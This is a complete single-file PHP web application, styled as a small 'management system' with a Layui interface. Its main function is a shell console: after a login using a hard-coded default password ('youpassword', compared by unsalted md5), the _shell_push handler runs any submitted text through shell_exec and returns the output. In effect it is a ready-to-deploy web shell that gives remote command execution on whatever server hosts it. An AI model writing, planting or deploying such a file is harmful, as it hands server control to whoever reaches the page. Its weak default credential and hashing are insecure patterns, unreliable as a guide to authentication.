<?php

# @link https://github.com/GeniusLe/gm.php

namespace {
    \sys\html\common::$web_name = '作死联萌单文件管理系统';
    \sys\user\login::password('youpassword'); # 这里是登录密码设置
    \sys\user\status::init();
    \sys\data::init($_POST, $_GET);
    \sys\event::init($_REQUEST);
}

namespace sys {
    class event
    {
        # $_SERVER, $_REQUEST
        private static $login = ['login', 'login_auth'];
        public static function init($_request_)
        {
            if (!isset($_request_['click'])) {
                $_request_['click'] = 'index';
            }
            $event = $_request_['click'];
            if (!\sys\user\status::is_login()) {
                if (!in_array($event, self::$login, true)) {
                    $event = 'login';
                }
            }
            $event = '_' . $event;
            event::$event();
        }
        public static function __callStatic($name, $arguments)
        {
            \sys\html\display('_404');
        }
        public static function _shell_push()
        {
            \sys\html\display_text(data::msg(0, shell_exec(data::post('shell_code'))));
        }
        public static function _index()
        {
            \sys\html\display('index');
        }
        public static function _out()
        {
            \sys\user\status::destroy();
            \sys\html\display('out');
        }
        public static function _login()
        {
            \sys\html\display('login');
        }
        public static function _login_auth()
        {
            if (!data::isset(data::post('password')) || !\sys\user\login::login(data::post('password'))) {
                \sys\html\display_text(data::msg(0, '密码错误'));
            }
            \sys\user\status::set_login_success();
            \sys\html\display_text(data::msg(1, 'ok'));
        }
    }
    class data
    {
        private static $post;
        private static $get;
        public static function init($post, $get)
        {
            self::$post = $post;
            self::$get = $get;
        }
        public static function isset($var)
        {
            return isset($var);
        }
        public static function post($name)
        {
            return self::$post[$name] ?? null;
        }
        public static function get($name)
        {
            return self::$get[$name] ?? null;
        }
        public static function msg($code, $m)
        {
            return json_encode(['code' => $code, 'msg' => $m], JSON_UNESCAPED_UNICODE);
        }
    }
}

namespace sys\shell {
    function shell_exec()
    {
    }
}

namespace sys\user {
    class login
    {
        private static $password;
        public static function password($password)
        {
            self::$password = md5($password);
        }
        public static function login($password)
        {
            return md5($password) === self::$password;
        }
    }
    class status
    {
        public static function init()
        {
            session_start();
        }
        public static function destroy()
        {
            session_destroy();
        }
        public static function is_login()
        {
            return isset($_SESSION['sys_login_status']);
        }
        public static function set_login_success()
        {
            return $_SESSION['sys_login_status'] = true;
        }
    }
}

namespace sys\html {
    function display_text($data)
    {
        exit($data);
    }
    function display($event)
    {
        exit(common::header($event)  . body::$event() . common::footer());
    }
    class common
    {
        public static $web_name = 'zslm.org';
        public static function header($title)
        {
            # https://layui.gitee.io/
            # https://www.staticfile.org/
            # https://www.jsdelivr.com/
            # https://cdnjs.com/
            # https://unpkg.com/
            $web_name = self::$web_name;
            return <<<html
            <!DOCTYPE html>
            <html>

            <head>
                <meta charset="UTF-8">
                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>{$title} - $web_name</title>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/layui/2.7.6/layui.min.js"></script>
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/layui/2.7.6/css/layui.min.css">
            </head>

            <body>
            html;
        }
        public static function footer()
        {
            $PHP_VERSION = PHP_OS . ' - php' . PHP_VERSION  . ' - ' . PHP_SAPI;
            return <<<html
            <!-- <script>
                    //注意：导航 依赖 element 模块，否则无法进行功能性操作
                    layui.use('element', function () {
                        var element = layui.element;
            
                        //…
                    });
                </script> -->
                <style>
                    .layui-input:hover,
                    .layui-textarea:hover {
                        border-color: rgb(60, 127, 43) !important;
                    }
            
                    .layui-input,
                    .layui-textarea {
                        border-color: rgb(0, 0, 0) !important;
                    }
                </style>
                <center><p class="layui-font-green"> 自豪的使用:$PHP_VERSION </p></center>
            </body>
            
            </html>
            html;
        }
    }
    class body
    {
        public static function _404()
        {
            return <<<html
            <div class="layui-container">
                <fieldset>
                    <legend>>>>>>>>>>>>>>>>>>></legend>
                    <center style="margin: 10%;">
                        <div class="layui-font-green" style="font-size: 20em;">404</div>
                    </center>
            </div>
            html;
        }
        public static function out()
        {
            return self::header_login() . <<<html
            <div class="layui-container">
                <fieldset>
                    <legend>>>>>>>>>>>>>>>>>>></legend>
                    <center style="margin: 10%;">
                        <div class="layui-font-green" style="font-size: 10em;">已退出</div>
                    </center>
            </div>
            html;
        }
        public static function login()
        {
            return self::header_login() . <<<html
                <div class="layui-container">
                    <fieldset>
                        <legend>>>>>>>>>>>>>>>>>>></legend>
                        <div class="layui-card">
                            <div class="layui-card-header layui-font-20 layui-font-green">登录</div>
                            <div class="layui-card-body">
                                <form class="layui-form layui-form-pane" action="">
                                    <div class="layui-form-item">
                                        <label class="layui-form-label">密码</label>
                                        <div class="layui-input-block">
                                            <input class="layui-input" style="border-color: #ff5722;" type="password"
                                                name="password" placeholder="请输入密码" autocomplete="off">
                                        </div>
                                    </div>
                                    <!-- <div class="layui-form-item">
                                        <label class="layui-form-label">动态码</label>
                                        <div class="layui-input-block">
                                            <input class="layui-input" style="border-color: #ff5722;" type="text" name="googleauth"
                                                placeholder="请输入动态码" autocomplete="off">
                                        </div>
                                    </div> -->
                                    <div class="layui-form-item">
                                        <div class="layui-input-block">
                                            <button class="layui-btn" lay-submit lay-filter="login">立即提交</button>
                                            <button type="reset" class="layui-btn layui-btn-primary">重置</button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
            
                    </fieldset>
                </div>
            
                <script>
                    layui.use('form', function () {
                        var form = layui.form;
                        form.on('submit(login)', function (data) {
                            if (data.field.password == '') { // || data.field.googleauth == ''
                                layer.msg('缺少参数');
                                return false;
                            }
                            $.post("?click=login_auth", data.field,
                                function (result) {
                                    layer.msg(result.msg);
                                    if(result.msg == 'ok') {
                                        window.location = '?click=index';
                                    }
                                }, "json")
                                .fail(function () {
                                    return false;
                                });
                            return false;
                        });
                    });
                </script>
            html;
        }
        public static function header_login()
        {
            return <<<html
            <ul class="layui-nav">
                <li class="layui-nav-item layui-this"><a href="?click=login">登录</a></li>
            </ul>
            html;
        }
        public static function header()
        {
            return <<<html
            <ul class="layui-nav">
                <li class="layui-nav-item layui-this"><a href="?click=index">首页</a></li>
                <li class="layui-nav-item">
                    <a href="javascript:;">系统</a>
                    <dl class="layui-nav-child">
                        <dd><a href="?click=out">退出</a></dd>
                    </dl>
                </li>
            </ul>
            html;
        }
        public static function index()
        {
            return self::header() . <<<html
            <div class="layui-container">
                <fieldset>
                    <legend>>>>>>>>>>>>>>>>>>></legend>
                    <div class="layui-card">
                        <div class="layui-card-header layui-font-20 layui-font-green">shell执行</div>
                        <div class="layui-card-body">
                            <form class="layui-form layui-form-pane" action="">
                                <div class="layui-form-item layui-form-text">
                                    <label class="layui-form-label">shell命令</label>
                                    <div class="layui-input-block">
                                        <textarea name="shell_code" placeholder="请输入内容" class="layui-textarea"></textarea>
                                    </div>
                                </div>
                                <div class="layui-form-item">
                                    <div class="layui-input-block">
                                        <button class="layui-btn" lay-submit lay-filter="shell_push">立即提交</button>
                                        <button type="reset" class="layui-btn layui-btn-primary">重置</button>
                                    </div>
                                </div>
                            </form>
                            <form class="layui-form layui-form-pane" action="">
                                <div class="layui-form-item layui-form-text">
                                    <label class="layui-form-label">响应结果</label>
                                    <div class="layui-input-block">
                                        <textarea disabled placeholder="响应结果" class="layui-textarea shell_return" rows="15"></textarea>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
        
                </fieldset>
            </div>
        
            <script>
                layui.use('form', function () {
                    var form = layui.form;
                    form.on('submit(shell_push)', function (data) {
                        if (data.field.shell_code == '') { // || data.field.googleauth == ''
                            layer.msg('缺少参数');
                            return false;
                        }
                        $.post("?click=shell_push", data.field,
                        function (result) {
                            $('.shell_return').text(result.msg);
                        }, "json")
                        .fail(function () {
                            return false;
                        });
                        return false;
                    });
                });
            </script>
            html;
        }
    }
}
